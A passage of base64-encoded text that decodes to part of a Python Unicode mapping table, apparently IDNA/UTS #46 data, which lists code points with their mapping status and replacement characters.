JywgXCdceGUxXHg4M1x4OTFcJyksXG4gICAgKDB4MUM5MiwgXCdNXCcsIFwnXHhlMVx4ODNceDkyXCcpLFxuICAgICgweDFDOTMsIFwnTVwnLCBcJ1x4ZTFceDgzXHg5M1wnKSxcbiAgICAoMHgxQzk0LCBcJ01cJywgXCdceGUxXHg4M1x4OTRcJyksXG4gICAgKDB4MUM5NSwgXCdNXCcsIFwnXHhlMVx4ODNceDk1XCcpLFxuICAgICgweDFDOTYsIFwnTVwnLCBcJ1x4ZTFceDgzXHg5NlwnKSxcbiAgICAoMHgxQzk3LCBcJ01cJywgXCdceGUxXHg4M1x4OTdcJyksXG4gICAgKDB4MUM5OCwgXCdNXCcsIFwnXHhlMVx4ODNceDk4XCcpLFxuICAgICgweDFDOTksIFwnTVwnLCBcJ1x4ZTFceDgzXHg5OVwnKSxcbiAgICAoMHgxQzlBLCBcJ01cJywgXCdceGUxXHg4M1x4OWFcJyksXG4gICAgKDB4MUM5QiwgXCdNXCcsIFwnXHhlMVx4ODNceDliXCcpLFxuICAgICgweDFDOUMsIFwnTVwnLCBcJ1x4ZTFceDgzXHg5Y1wnKSxcbiAgICAoMHgxQzlELCBcJ01cJywgXCdceGUxXHg4M1x4OWRcJyksXG4gICAgKDB4MUM5RSwgXCdNXCcsIFwnXHhlMVx4ODNceDllXCcpLFxuICAgICgweDFDOUYsIFwnTVwnLCBcJ1x4ZTFceDgzXHg5ZlwnKSxcbiAgICAoMHgxQ0EwLCBcJ01cJywgXCdceGUxXHg4M1x4YTBcJyksXG4gICAgKDB4MUNBMSwgXCdNXCcsIFwnXHhlMVx4ODNceGExXCcpLFxuICAgICgweDFDQTIsIFwnTVwnLCBcJ1x4ZTFceDgzXHhhMlwnKSxcbiAgICAoMHgxQ0EzLCBcJ01cJywgXCdceGUxXHg4M1x4YTNcJyksXG4gICAgKDB4MUNBNCwgXCdNXCcsIFwnXHhlMVx4ODNceGE0XCcpLFxuICAgICgweDFDQTUsIFwnTVwnLCBcJ1x4ZTFceDgzXHhhNVwnKSxcbiAgICAoMHgxQ0E2LCBcJ01cJywgXCdceGUxXHg4M1x4YTZcJyksXG4gICAgKDB4MUNBNywgXCdNXCcsIFwnXHhlMVx4ODNceGE3XCcpLFxuICAgICgweDFDQTgsIFwnTVwnLCBcJ1x4ZTFceDgzXHhhOFwnKSxcbiAgICAoMHgxQ0E5LCBcJ01cJywgXCdceGUxXHg4M1x4YTlcJyksXG4gICAgKDB4MUNBQSwgXCdNXCcsIFwnXHhlMVx4ODNceGFhXCcpLFxuICAgICgweDFDQUIsIFwnTVwnLCBcJ1x4ZTFceDgzXHhhYlwnKSxcbiAgICAoMHgxQ0FDLCBcJ01cJywgXCdceGUxXHg4M1x4YWNcJyksXG4gICAgKDB4MUNBRCwgXCdNXCcsIFwnXHhlMVx4ODNceGFkXCcpLFxuICAgICgweDFDQUUsIFwnTVwnLCBcJ1x4ZTFceDgzXHhhZVwnKSxcbiAgICAoMHgxQ0FGLCBcJ01cJywgXCdceGUxXHg4M1x4YWZcJyksXG4gICAgKDB4MUNCMCwgXCdNXCcsIFwnXHhlMVx4ODNceGIwXCcpLFxuICAgICgweDFDQjEsIFwnTVwnLCBcJ1x4ZTFceDgzXHhiMVwnKSxcbiAgICAoMHgxQ0IyLCBcJ01cJywgXCdceGUxXHg4M1x4YjJcJyksXG4gICAgKDB4MUNCMywgXCdNXCcsIFwnXHhlMVx4ODNceGIzXCcpLFxuICAgICgweDFDQjQsIFwnTVwnLCBcJ1x4ZTFceDgzXHhiNFwnKSxcbiAgICAoMHgxQ0I1LCBcJ01cJywgXCdceGUxXHg4M1x4YjVcJyksXG4gICAgKDB4MUNCNiwgXCdNXCcsIFwnXHhlMVx4ODNceGI2XCcpLFxuICAgICgweDFDQjcsIFwnTVwnLCBcJ1x4ZTFceDgzXHhiN1wnKSxcbiAgICAoMHgxQ0I4LCBcJ01cJywgXCdceGUxXHg4M1x4YjhcJyksXG4gICAgKDB4MUNCOSwgXCdNXCcsIFwnXHhlMVx4ODNceGI5XCcpLFxuICAgICgweDFDQkEsIFwnTVwnLCBcJ1x4ZTFceDgzXHhiYVwnKSxcbiAgICAoMHgxQ0JCLCBcJ1hcJyksXG4gICAgKDB4MUNCRCwgXCdNXCcsIFwnXHhlMVx4ODNceGJkXCcpLFxuICAgICgweDFDQkUsIFwnTVwnLCBcJ1x4ZTFceDgzXHhiZVwnKSxcbiAgICAoMHgxQ0JGLCBcJ01cJywgXCdceGUxXHg4M1x4YmZcJyksXG4gICAgKDB4MUNDMCwgXCdWXCcpLFxuICAgICgweDFDQzgsIFwnWFwnKSxcbiAgICAoMHgxQ0QwLCBcJ1ZcJyksXG4gICAgKDB4MUNGQiwgXCdYXCcpLFxuICAgICgweDFEMDAsIFwnVlwnKSxcbiAgICAoMHgxRDJDLCBcJ01cJywgXCdhXCcpLFxuICAgICgweDFEMkQsIFwnTVwnLCBcJ1x4YzNceGE2XCcpLFxuICAgICgweDFEMkUsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQyRiwgXCdWXCcpLFxuICAgICgweDFEMzAsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQzMSwgXCdNXCcsIFwnZVwnKSxcbiAgICAoMHgxRDMyLCBcJ01cJywgXCdceGM3XHg5ZFwnKSxcbiAgICAoMHgxRDMzLCBcJ01cJywgXCdnXCcpLFxuICAgICgweDFEMzQsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQzNSwgXCdNXCcsIFwnaVwnKSxcbiAgICAoMHgxRDM2LCBcJ01cJywgXCdqXCcpLFxuICAgICgweDFEMzcsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQzOCwgXCdNXCcsIFwnbFwnKSxcbiAgICAoMHgxRDM5LCBcJ01cJywgXCdtXCcpLFxuICAgICgweDFEM0EsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQzQiwgXCdWXCcpLFxuICAgICgweDFEM0MsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQzRCwgXCdNXCcsIFwnXHhjOFx4YTNcJyksXG4gICAgKDB4MUQzRSwgXCdNXCcsIFwncFwnKSxcbiAgICAoMHgxRDNGLCBcJ01cJywgXCdyXCcpLFxuICAgICgweDFENDAsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ0MSwgXCdNXCcsIFwndVwnKSxcbiAgICAoMHgxRDQyLCBcJ01cJywgXCd3XCcpLFxuICAgICgweDFENDMsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ0NCwgXCdNXCcsIFwnXHhjOVx4OTBcJyksXG4gICAgKDB4MUQ0NSwgXCdNXCcsIFwnXHhjOVx4OTFcJyksXG4gICAgKDB4MUQ0NiwgXCdNXCcsIFwnXHhlMVx4YjRceDgyXCcpLFxuICAgICgweDFENDcsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ0OCwgXCdNXCcsIFwnZFwnKSxcbiAgICAoMHgxRDQ5LCBcJ01cJywgXCdlXCcpLFxuICAgICgweDFENEEsIFwnTVwnLCBcJ1x4YzlceDk5XCcpLFxuICAgICgweDFENEIsIFwnTVwnLCBcJ1x4YzlceDliXCcpLFxuICAgICgweDFENEMsIFwnTVwnLCBcJ1x4YzlceDljXCcpLFxuICAgICgweDFENEQsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ0RSwgXCdWXCcpLFxuICAgICgweDFENEYsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1MCwgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgxRDUxLCBcJ01cJywgXCdceGM1XHg4YlwnKSxcbiAgICAoMHgxRDUyLCBcJ01cJywgXCdvXCcpLFxuICAgICgweDFENTMsIFwnTVwnLCBcJ1x4YzlceDk0XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMTYoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFENTQsIFwnTVwnLCBcJ1x4ZTFceGI0XHg5NlwnKSxcbiAgICAoMHgxRDU1LCBcJ01cJywgXCdceGUxXHhiNFx4OTdcJyksXG4gICAgKDB4MUQ1NiwgXCdNXCcsIFwncFwnKSxcbiAgICAoMHgxRDU3LCBcJ01cJywgXCd0XCcpLFxuICAgICgweDFENTgsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1OSwgXCdNXCcsIFwnXHhlMVx4YjRceDlkXCcpLFxuICAgICgweDFENUEsIFwnTVwnLCBcJ1x4YzlceGFmXCcpLFxuICAgICgweDFENUIsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1QywgXCdNXCcsIFwnXHhlMVx4YjRceGE1XCcpLFxuICAgICgweDFENUQsIFwnTVwnLCBcJ1x4Y2VceGIyXCcpLFxuICAgICgweDFENUUsIFwnTVwnLCBcJ1x4Y2VceGIzXCcpLFxuICAgICgweDFENUYsIFwnTVwnLCBcJ1x4Y2VceGI0XCcpLFxuICAgICgweDFENjAsIFwnTVwnLCBcJ1x4Y2ZceDg2XCcpLFxuICAgICgweDFENjEsIFwnTVwnLCBcJ1x4Y2ZceDg3XCcpLFxuICAgICgweDFENjIsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ2MywgXCdNXCcsIFwnclwnKSxcbiAgICAoMHgxRDY0LCBcJ01cJywgXCd1XCcpLFxuICAgICgweDFENjUsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2NiwgXCdNXCcsIFwnXHhjZVx4YjJcJyksXG4gICAgKDB4MUQ2NywgXCdNXCcsIFwnXHhjZVx4YjNcJyksXG4gICAgKDB4MUQ2OCwgXCdNXCcsIFwnXHhjZlx4ODFcJyksXG4gICAgKDB4MUQ2OSwgXCdNXCcsIFwnXHhjZlx4ODZcJyksXG4gICAgKDB4MUQ2QSwgXCdNXCcsIFwnXHhjZlx4ODdcJyksXG4gICAgKDB4MUQ2QiwgXCdWXCcpLFxuICAgICgweDFENzgsIFwnTVwnLCBcJ1x4ZDBceGJkXCcpLFxuICAgICgweDFENzksIFwnVlwnKSxcbiAgICAoMHgxRDlCLCBcJ01cJywgXCdceGM5XHg5MlwnKSxcbiAgICAoMHgxRDlDLCBcJ01cJywgXCdjXCcpLFxuICAgICgweDFEOUQsIFwnTVwnLCBcJ1x4YzlceDk1XCcpLFxuICAgICgweDFEOUUsIFwnTVwnLCBcJ1x4YzNceGIwXCcpLFxuICAgICgweDFEOUYsIFwnTVwnLCBcJ1x4YzlceDljXCcpLFxuICAgICgweDFEQTAsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MURBMSwgXCdNXCcsIFwnXHhjOVx4OWZcJyksXG4gICAgKDB4MURBMiwgXCdNXCcsIFwnXHhjOVx4YTFcJyksXG4gICAgKDB4MURBMywgXCdNXCcsIFwnXHhjOVx4YTVcJyksXG4gICAgKDB4MURBNCwgXCdNXCcsIFwnXHhjOVx4YThcJyksXG4gICAgKDB4MURBNSwgXCdNXCcsIFwnXHhjOVx4YTlcJyksXG4gICAgKDB4MURBNiwgXCdNXCcsIFwnXHhjOVx4YWFcJyksXG4gICAgKDB4MURBNywgXCdNXCcsIFwnXHhlMVx4YjVceGJiXCcpLFxuICAgICgweDFEQTgsIFwnTVwnLCBcJ1x4Y2FceDlkXCcpLFxuICAgICgweDFEQTksIFwnTVwnLCBcJ1x4YzlceGFkXCcpLFxuICAgICgweDFEQUEsIFwnTVwnLCBcJ1x4ZTFceGI2XHg4NVwnKSxcbiAgICAoMHgxREFCLCBcJ01cJywgXCdceGNhXHg5ZlwnKSxcbiAgICAoMHgxREFDLCBcJ01cJywgXCdceGM5XHhiMVwnKSxcbiAgICAoMHgxREFELCBcJ01cJywgXCdceGM5XHhiMFwnKSxcbiAgICAoMHgxREFFLCBcJ01cJywgXCdceGM5XHhiMlwnKSxcbiAgICAoMHgxREFGLCBcJ01cJywgXCdceGM5XHhiM1wnKSxcbiAgICAoMHgxREIwLCBcJ01cJywgXCdceGM5XHhiNFwnKSxcbiAgICAoMHgxREIxLCBcJ01cJywgXCdceGM5XHhiNVwnKSxcbiAgICAoMHgxREIyLCBcJ01cJywgXCdceGM5XHhiOFwnKSxcbiAgICAoMHgxREIzLCBcJ01cJywgXCdceGNhXHg4MlwnKSxcbiAgICAoMHgxREI0LCBcJ01cJywgXCdceGNhXHg4M1wnKSxcbiAgICAoMHgxREI1LCBcJ01cJywgXCdceGM2XHhhYlwnKSxcbiAgICAoMHgxREI2LCBcJ01cJywgXCdceGNhXHg4OVwnKSxcbiAgICAoMHgxREI3LCBcJ01cJywgXCdceGNhXHg4YVwnKSxcbiAgICAoMHgxREI4LCBcJ01cJywgXCdceGUxXHhiNFx4OWNcJyksXG4gICAgKDB4MURCOSwgXCdNXCcsIFwnXHhjYVx4OGJcJyksXG4gICAgKDB4MURCQSwgXCdNXCcsIFwnXHhjYVx4OGNcJyksXG4gICAgKDB4MURCQiwgXCdNXCcsIFwnelwnKSxcbiAgICAoMHgxREJDLCBcJ01cJywgXCdceGNhXHg5MFwnKSxcbiAgICAoMHgxREJELCBcJ01cJywgXCdceGNhXHg5MVwnKSxcbiAgICAoMHgxREJFLCBcJ01cJywgXCdceGNhXHg5MlwnKSxcbiAgICAoMHgxREJGLCBcJ01cJywgXCdceGNlXHhiOFwnKSxcbiAgICAoMHgxREMwLCBcJ1ZcJyksXG4gICAgKDB4MUUwMCwgXCdNXCcsIFwnXHhlMVx4YjhceDgxXCcpLFxuICAgICgweDFFMDEsIFwnVlwnKSxcbiAgICAoMHgxRTAyLCBcJ01cJywgXCdceGUxXHhiOFx4ODNcJyksXG4gICAgKDB4MUUwMywgXCdWXCcpLFxuICAgICgweDFFMDQsIFwnTVwnLCBcJ1x4ZTFceGI4XHg4NVwnKSxcbiAgICAoMHgxRTA1LCBcJ1ZcJyksXG4gICAgKDB4MUUwNiwgXCdNXCcsIFwnXHhlMVx4YjhceDg3XCcpLFxuICAgICgweDFFMDcsIFwnVlwnKSxcbiAgICAoMHgxRTA4LCBcJ01cJywgXCdceGUxXHhiOFx4ODlcJyksXG4gICAgKDB4MUUwOSwgXCdWXCcpLFxuICAgICgweDFFMEEsIFwnTVwnLCBcJ1x4ZTFceGI4XHg4YlwnKSxcbiAgICAoMHgxRTBCLCBcJ1ZcJyksXG4gICAgKDB4MUUwQywgXCdNXCcsIFwnXHhlMVx4YjhceDhkXCcpLFxuICAgICgweDFFMEQsIFwnVlwnKSxcbiAgICAoMHgxRTBFLCBcJ01cJywgXCdceGUxXHhiOFx4OGZcJyksXG4gICAgKDB4MUUwRiwgXCdWXCcpLFxuICAgICgweDFFMTAsIFwnTVwnLCBcJ1x4ZTFceGI4XHg5MVwnKSxcbiAgICAoMHgxRTExLCBcJ1ZcJyksXG4gICAgKDB4MUUxMiwgXCdNXCcsIFwnXHhlMVx4YjhceDkzXCcpLFxuICAgICgweDFFMTMsIFwnVlwnKSxcbiAgICAoMHgxRTE0LCBcJ01cJywgXCdceGUxXHhiOFx4OTVcJyksXG4gICAgKDB4MUUxNSwgXCdWXCcpLFxuICAgICgweDFFMTYsIFwnTVwnLCBcJ1x4ZTFceGI4XHg5N1wnKSxcbiAgICAoMHgxRTE3LCBcJ1ZcJyksXG4gICAgKDB4MUUxOCwgXCdNXCcsIFwnXHhlMVx4YjhceDk5XCcpLFxuICAgICgweDFFMTksIFwnVlwnKSxcbiAgICAoMHgxRTFBLCBcJ01cJywgXCdceGUxXHhiOFx4OWJcJyksXG4gICAgKDB4MUUxQiwgXCdWXCcpLFxuICAgICgweDFFMUMsIFwnTVwnLCBcJ1x4ZTFceGI4XHg5ZFwnKSxcbiAgICAoMHgxRTFELCBcJ1ZcJyksXG4gICAgKDB4MUUxRSwgXCdNXCcsIFwnXHhlMVx4YjhceDlmXCcpLFxuICAgICgweDFFMUYsIFwnVlwnKSxcbiAgICAoMHgxRTIwLCBcJ01cJywgXCdceGUxXHhiOFx4YTFcJyksXG4gICAgKDB4MUUyMSwgXCdWXCcpLFxuICAgICgweDFFMjIsIFwnTVwnLCBcJ1x4ZTFceGI4XHhhM1wnKSxcbiAgICAoMHgxRTIzLCBcJ1ZcJyksXG4gICAgXVxuXG5kZWYgX3NlZ18xNygpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MUUyNCwgXCdNXCcsIFwnXHhlMVx4YjhceGE1XCcpLFxuICAgICgweDFFMjUsIFwnVlwnKSxcbiAgICAoMHgxRTI2LCBcJ01cJywgXCdceGUxXHhiOFx4YTdcJyksXG4gICAgKDB4MUUyNywgXCdWXCcpLFxuICAgICgweDFFMjgsIFwnTVwnLCBcJ1x4ZTFceGI4XHhhOVwnKSxcbiAgICAoMHgxRTI5LCBcJ1ZcJyksXG4gICAgKDB4MUUyQSwgXCdNXCcsIFwnXHhlMVx4YjhceGFiXCcpLFxuICAgICgweDFFMkIsIFwnVlwnKSxcbiAgICAoMHgxRTJDLCBcJ01cJywgXCdceGUxXHhiOFx4YWRcJyksXG4gICAgKDB4MUUyRCwgXCdWXCcpLFxuICAgICgweDFFMkUsIFwnTVwnLCBcJ1x4ZTFceGI4XHhhZlwnKSxcbiAgICAoMHgxRTJGLCBcJ1ZcJyksXG4gICAgKDB4MUUzMCwgXCdNXCcsIFwnXHhlMVx4YjhceGIxXCcpLFxuICAgICgweDFFMzEsIFwnVlwnKSxcbiAgICAoMHgxRTMyLCBcJ01cJywgXCdceGUxXHhiOFx4YjNcJyksXG4gICAgKDB4MUUzMywgXCdWXCcpLFxuICAgICgweDFFMzQsIFwnTVwnLCBcJ1x4ZTFceGI4XHhiNVwnKSxcbiAgICAoMHgxRTM1LCBcJ1ZcJyksXG4gICAgKDB4MUUzNiwgXCdNXCcsIFwnXHhlMVx4YjhceGI3XCcpLFxuICAgICgweDFFMzcsIFwnVlwnKSxcbiAgICAoMHgxRTM4LCBcJ01cJywgXCdceGUxXHhiOFx4YjlcJyksXG4gICAgKDB4MUUzOSwgXCdWXCcpLFxuICAgICgweDFFM0EsIFwnTVwnLCBcJ1x4ZTFceGI4XHhiYlwnKSxcbiAgICAoMHgxRTNCLCBcJ1ZcJyksXG4gICAgKDB4MUUzQywgXCdNXCcsIFwnXHhlMVx4YjhceGJkXCcpLFxuICAgICgweDFFM0QsIFwnVlwnKSxcbiAgICAoMHgxRTNFLCBcJ01cJywgXCdceGUxXHhiOFx4YmZcJyksXG4gICAgKDB4MUUzRiwgXCdWXCcpLFxuICAgICgweDFFNDAsIFwnTVwnLCBcJ1x4ZTFceGI5XHg4MVwnKSxcbiAgICAoMHgxRTQxLCBcJ1ZcJyksXG4gICAgKDB4MUU0MiwgXCdNXCcsIFwnXHhlMVx4YjlceDgzXCcpLFxuICAgICgweDFFNDMsIFwnVlwnKSxcbiAgICAoMHgxRTQ0LCBcJ01cJywgXCdceGUxXHhiOVx4ODVcJyksXG4gICAgKDB4MUU0NSwgXCdWXCcpLFxuICAgICgweDFFNDYsIFwnTVwnLCBcJ1x4ZTFceGI5XHg4N1wnKSxcbiAgICAoMHgxRTQ3LCBcJ1ZcJyksXG4gICAgKDB4MUU0OCwgXCdNXCcsIFwnXHhlMVx4YjlceDg5XCcpLFxuICAgICgweDFFNDksIFwnVlwnKSxcbiAgICAoMHgxRTRBLCBcJ01cJywgXCdceGUxXHhiOVx4OGJcJyksXG4gICAgKDB4MUU0QiwgXCdWXCcpLFxuICAgICgweDFFNEMsIFwnTVwnLCBcJ1x4ZTFceGI5XHg4ZFwnKSxcbiAgICAoMHgxRTRELCBcJ1ZcJyksXG4gICAgKDB4MUU0RSwgXCdNXCcsIFwnXHhlMVx4YjlceDhmXCcpLFxuICAgICgweDFFNEYsIFwnVlwnKSxcbiAgICAoMHgxRTUwLCBcJ01cJywgXCdceGUxXHhiOVx4OTFcJyksXG4gICAgKDB4MUU1MSwgXCdWXCcpLFxuICAgICgweDFFNTIsIFwnTVwnLCBcJ1x4ZTFceGI5XHg5M1wnKSxcbiAgICAoMHgxRTUzLCBcJ1ZcJyksXG4gICAgKDB4MUU1NCwgXCdNXCcsIFwnXHhlMVx4YjlceDk1XCcpLFxuICAgICgweDFFNTUsIFwnVlwnKSxcbiAgICAoMHgxRTU2LCBcJ01cJywgXCdceGUxXHhiOVx4OTdcJyksXG4gICAgKDB4MUU1NywgXCdWXCcpLFxuICAgICgweDFFNTgsIFwnTVwnLCBcJ1x4ZTFceGI5XHg5OVwnKSxcbiAgICAoMHgxRTU5LCBcJ1ZcJyksXG4gICAgKDB4MUU1QSwgXCdNXCcsIFwnXHhlMVx4YjlceDliXCcpLFxuICAgICgweDFFNUIsIFwnVlwnKSxcbiAgICAoMHgxRTVDLCBcJ01cJywgXCdceGUxXHhiOVx4OWRcJyksXG4gICAgKDB4MUU1RCwgXCdWXCcpLFxuICAgICgweDFFNUUsIFwnTVwnLCBcJ1x4ZTFceGI5XHg5ZlwnKSxcbiAgICAoMHgxRTVGLCBcJ1ZcJyksXG4gICAgKDB4MUU2MCwgXCdNXCcsIFwnXHhlMVx4YjlceGExXCcpLFxuICAgICgweDFFNjEsIFwnVlwnKSxcbiAgICAoMHgxRTYyLCBcJ01cJywgXCdceGUxXHhiOVx4YTNcJyksXG4gICAgKDB4MUU2MywgXCdWXCcpLFxuICAgICgweDFFNjQsIFwnTVwnLCBcJ1x4ZTFceGI5XHhhNVwnKSxcbiAgICAoMHgxRTY1LCBcJ1ZcJyksXG4gICAgKDB4MUU2NiwgXCdNXCcsIFwnXHhlMVx4YjlceGE3XCcpLFxuICAgICgweDFFNjcsIFwnVlwnKSxcbiAgICAoMHgxRTY4LCBcJ01cJywgXCdceGUxXHhiOVx4YTlcJyksXG4gICAgKDB4MUU2OSwgXCdWXCcpLFxuICAgICgweDFFNkEsIFwnTVwnLCBcJ1x4ZTFceGI5XHhhYlwnKSxcbiAgICAoMHgxRTZCLCBcJ1ZcJyksXG4gICAgKDB4MUU2QywgXCdNXCcsIFwnXHhlMVx4YjlceGFkXCcpLFxuICAgICgweDFFNkQsIFwnVlwnKSxcbiAgICAoMHgxRTZFLCBcJ01cJywgXCdceGUxXHhiOVx4YWZcJyksXG4gICAgKDB4MUU2RiwgXCdWXCcpLFxuICAgICgweDFFNzAsIFwnTVwnLCBcJ1x4ZTFceGI5XHhiMVwnKSxcbiAgICAoMHgxRTcxLCBcJ1ZcJyksXG4gICAgKDB4MUU3MiwgXCdNXCcsIFwnXHhlMVx4YjlceGIzXCcpLFxuICAgICgweDFFNzMsIFwnVlwnKSxcbiAgICAoMHgxRTc0LCBcJ01cJywgXCdceGUxXHhiOVx4YjVcJyksXG4gICAgKDB4MUU3NSwgXCdWXCcpLFxuICAgICgweDFFNzYsIFwnTVwnLCBcJ1x4ZTFceGI5XHhiN1wnKSxcbiAgICAoMHgxRTc3LCBcJ1ZcJyksXG4gICAgKDB4MUU3OCwgXCdNXCcsIFwnXHhlMVx4YjlceGI5XCcpLFxuICAgICgweDFFNzksIFwnVlwnKSxcbiAgICAoMHgxRTdBLCBcJ01cJywgXCdceGUxXHhiOVx4YmJcJyksXG4gICAgKDB4MUU3QiwgXCdWXCcpLFxuICAgICgweDFFN0MsIFwnTVwnLCBcJ1x4ZTFceGI5XHhiZFwnKSxcbiAgICAoMHgxRTdELCBcJ1ZcJyksXG4gICAgKDB4MUU3RSwgXCdNXCcsIFwnXHhlMVx4YjlceGJmXCcpLFxuICAgICgweDFFN0YsIFwnVlwnKSxcbiAgICAoMHgxRTgwLCBcJ01cJywgXCdceGUxXHhiYVx4ODFcJyksXG4gICAgKDB4MUU4MSwgXCdWXCcpLFxuICAgICgweDFFODIsIFwnTVwnLCBcJ1x4ZTFceGJhXHg4M1wnKSxcbiAgICAoMHgxRTgzLCBcJ1ZcJyksXG4gICAgKDB4MUU4NCwgXCdNXCcsIFwnXHhlMVx4YmFceDg1XCcpLFxuICAgICgweDFFODUsIFwnVlwnKSxcbiAgICAoMHgxRTg2LCBcJ01cJywgXCdceGUxXHhiYVx4ODdcJyksXG4gICAgKDB4MUU4NywgXCdWXCcpLFxuICAgIF1cblxuZGVmIF9zZWdfMTgoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFFODgsIFwnTVwnLCBcJ1x4ZTFceGJhXHg4OVwnKSxcbiAgICAoMHgxRTg5LCBcJ1ZcJyksXG4gICAgKDB4MUU4QSwgXCdNXCcsIFwnXHhlMVx4YmFceDhiXCcpLFxuICAgICgweDFFOEIsIFwnVlwnKSxcbiAgICAoMHgxRThDLCBcJ01cJywgXCdceGUxXHhiYVx4OGRcJyksXG4gICAgKDB4MUU4RCwgXCdWXCcpLFxuICAgICgweDFFOEUsIFwnTVwnLCBcJ1x4ZTFceGJhXHg4ZlwnKSxcbiAgICAoMHgxRThGLCBcJ1ZcJyksXG4gICAgKDB4MUU5MCwgXCdNXCcsIFwnXHhlMVx4YmFceDkxXCcpLFxuICAgICgweDFFOTEsIFwnVlwnKSxcbiAgICAoMHgxRTkyLCBcJ01cJywgXCdceGUxXHhiYVx4OTNcJyksXG4gICAgKDB4MUU5MywgXCdWXCcpLFxuICAgICgweDFFOTQsIFwnTVwnLCBcJ1x4ZTFceGJhXHg5NVwnKSxcbiAgICAoMHgxRTk1LCBcJ1ZcJyksXG4gICAgKDB4MUU5QSwgXCdNXCcsIFwnYVx4Y2FceGJlXCcpLFxuICAgICgweDFFOUIsIFwnTVwnLCBcJ1x4ZTFceGI5XHhhMVwnKSxcbiAgICAoMHgxRTlDLCBcJ1ZcJyksXG4gICAgKDB4MUU5RSwgXCdNXCcsIFwnc3NcJyksXG4gICAgKDB4MUU5RiwgXCdWXCcpLFxuICAgICgweDFFQTAsIFwnTVwnLCBcJ1x4ZTFceGJhXHhhMVwnKSxcbiAgICAoMHgxRUExLCBcJ1ZcJyksXG4gICAgKDB4MUVBMiwgXCdNXCcsIFwnXHhlMVx4YmFceGEzXCcpLFxuICAgICgweDFFQTMsIFwnVlwnKSxcbiAgICAoMHgxRUE0LCBcJ01cJywgXCdceGUxXHhiYVx4YTVcJyksXG4gICAgKDB4MUVBNSwgXCdWXCcpLFxuICAgICgweDFFQTYsIFwnTVwnLCBcJ1x4ZTFceGJhXHhhN1wnKSxcbiAgICAoMHgxRUE3LCBcJ1ZcJyksXG4gICAgKDB4MUVBOCwgXCdNXCcsIFwnXHhlMVx4YmFceGE5XCcpLFxuICAgICgweDFFQTksIFwnVlwnKSxcbiAgICAoMHgxRUFBLCBcJ01cJywgXCdceGUxXHhiYVx4YWJcJyksXG4gICAgKDB4MUVBQiwgXCdWXCcpLFxuICAgICgweDFFQUMsIFwnTVwnLCBcJ1x4ZTFceGJhXHhhZFwnKSxcbiAgICAoMHgxRUFELCBcJ1ZcJyksXG4gICAgKDB4MUVBRSwgXCdNXCcsIFwnXHhlMVx4YmFceGFmXCcpLFxuICAgICgweDFFQUYsIFwnVlwnKSxcbiAgICAoMHgxRUIwLCBcJ01cJywgXCdceGUxXHhiYVx4YjFcJyksXG4gICAgKDB4MUVCMSwgXCdWXCcpLFxuICAgICgweDFFQjIsIFwnTVwnLCBcJ1x4ZTFceGJhXHhiM1wnKSxcbiAgICAoMHgxRUIzLCBcJ1ZcJyksXG4gICAgKDB4MUVCNCwgXCdNXCcsIFwnXHhlMVx4YmFceGI1XCcpLFxuICAgICgweDFFQjUsIFwnVlwnKSxcbiAgICAoMHgxRUI2LCBcJ01cJywgXCdceGUxXHhiYVx4YjdcJyksXG4gICAgKDB4MUVCNywgXCdWXCcpLFxuICAgICgweDFFQjgsIFwnTVwnLCBcJ1x4ZTFceGJhXHhiOVwnKSxcbiAgICAoMHgxRUI5LCBcJ1ZcJyksXG4gICAgKDB4MUVCQSwgXCdNXCcsIFwnXHhlMVx4YmFceGJiXCcpLFxuICAgICgweDFFQkIsIFwnVlwnKSxcbiAgICAoMHgxRUJDLCBcJ01cJywgXCdceGUxXHhiYVx4YmRcJyksXG4gICAgKDB4MUVCRCwgXCdWXCcpLFxuICAgICgweDFFQkUsIFwnTVwnLCBcJ1x4ZTFceGJhXHhiZlwnKSxcbiAgICAoMHgxRUJGLCBcJ1ZcJyksXG4gICAgKDB4MUVDMCwgXCdNXCcsIFwnXHhlMVx4YmJceDgxXCcpLFxuICAgICgweDFFQzEsIFwnVlwnKSxcbiAgICAoMHgxRUMyLCBcJ01cJywgXCdceGUxXHhiYlx4ODNcJyksXG4gICAgKDB4MUVDMywgXCdWXCcpLFxuICAgICgweDFFQzQsIFwnTVwnLCBcJ1x4ZTFceGJiXHg4NVwnKSxcbiAgICAoMHgxRUM1LCBcJ1ZcJyksXG4gICAgKDB4MUVDNiwgXCdNXCcsIFwnXHhlMVx4YmJceDg3XCcpLFxuICAgICgweDFFQzcsIFwnVlwnKSxcbiAgICAoMHgxRUM4LCBcJ01cJywgXCdceGUxXHhiYlx4ODlcJyksXG4gICAgKDB4MUVDOSwgXCdWXCcpLFxuICAgICgweDFFQ0EsIFwnTVwnLCBcJ1x4ZTFceGJiXHg4YlwnKSxcbiAgICAoMHgxRUNCLCBcJ1ZcJyksXG4gICAgKDB4MUVDQywgXCdNXCcsIFwnXHhlMVx4YmJceDhkXCcpLFxuICAgICgweDFFQ0QsIFwnVlwnKSxcbiAgICAoMHgxRUNFLCBcJ01cJywgXCdceGUxXHhiYlx4OGZc